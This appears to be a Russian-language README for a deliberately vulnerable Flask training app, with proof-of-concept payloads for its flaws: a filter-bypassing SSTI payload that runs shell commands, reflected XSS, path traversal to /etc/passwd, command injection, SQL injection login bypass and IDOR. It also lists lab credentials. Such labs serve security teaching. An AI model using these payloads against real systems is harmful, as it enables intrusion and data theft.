# vuln-app
#Уязвимая версия приложения

### Инструкция по сборке и запуску приложения

> - git clone "текущий репозиторий"
> - cd app
> - python __init__.py
> - flask приложение будет запущено по адресу http://127.0.0.1:8089

![image](https://github.com/medarov411/vuln-app/assets/60567375/302c807a-5503-411e-a291-bbe552f247ec)



### Proof of Concept

SSTI:

> url - http://127.0.0.1:8089/contact. Контактная форма, с одним полем ввода.

> Настроил блеклист для ssti, чтоб пейлоад был поинтересней. blacklist = [".","[","]","_","join","init","flag"]

> Конечный пейлоад: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}

> ![image](https://github.com/medarov411/vuln-app/assets/60567375/0635d79b-576c-4515-8675-169c49209763)

<p>&nbsp;</p>

XSS(reflected):
> xss эксплуатируется там же, где и ssti - http://127.0.0.1:8089/contact

> http://127.0.0.1:8089/contact?email=<script>alert(1)</script>

> ![image](https://github.com/medarov411/vuln-app/assets/60567375/0b6d6749-0813-4635-aaf4-69384d24f5f8)

<p>&nbsp;</p>

Path Traversal:
> кнопка Read Policy на главной странице "http://127.0.0.1:8089/" ведет на url "http://127.0.0.1:8089/view_file?filename=15020.pdf"

> пейлоад:http://127.0.0.1:8089/view_file?filename=../../../../../etc/passwd

> ![image](https://github.com/medarov411/vuln-app/assets/60567375/2b8cf974-f629-443f-b30c-5925e08defb1)

<p>&nbsp;</p>

OS Command injection:
> на сайте реализовано подобие ping сервиса. Url - http://127.0.0.1:8089/ping

>пейлоад: 127.0.0.1;ls

>![image](https://github.com/medarov411/vuln-app/assets/60567375/303665c2-83d6-41ba-8fd2-5706ad0efa01)

<p>&nbsp;</p>

SQLI:
> форма авторизации в админ панель подвержена sql инъекциям. url - http://127.0.0.1:8089/login

>в базе данных есть два юзера - admin:jasper, wiener:password

>При успешной авторизации, происходит редирект на /admin-panel?user={username}
>![image](https://github.com/medarov411/vuln-app/assets/60567375/6e520b0f-355b-4377-8839-0b1740a8bcf7)
P.S не обращайте внимания, что там написано IDOR. Эта админ панель далее будет использована в демонстрации IDOR уязвимости.

>При не правильных данных: Login Failed
>![image](https://github.com/medarov411/vuln-app/assets/60567375/486498d8-1a5b-4fa2-a2de-7922159825b4)

>пейлоад: admin' or 1=1--

<p>&nbsp;</p>

IDOR:
> idor связан с админ панелью. У нас есть второй юзер wiener. Но когда он авторизовывается, то доступ у него закрыт к админ панели.
![image](https://github.com/medarov411/vuln-app/assets/60567375/ae45a797-1f04-4299-a1d0-a2633404bbcb)

> Но если изменить параметр user в /admin-panel?user=wiener на /admin-panel?user=admin, то доступ появляется
 
### Дополнительные комментарии
> От себя решил добавить SSTI с фильтрацией, все таки это flask. Не добавить в него ssti, было бы неуважительно :)


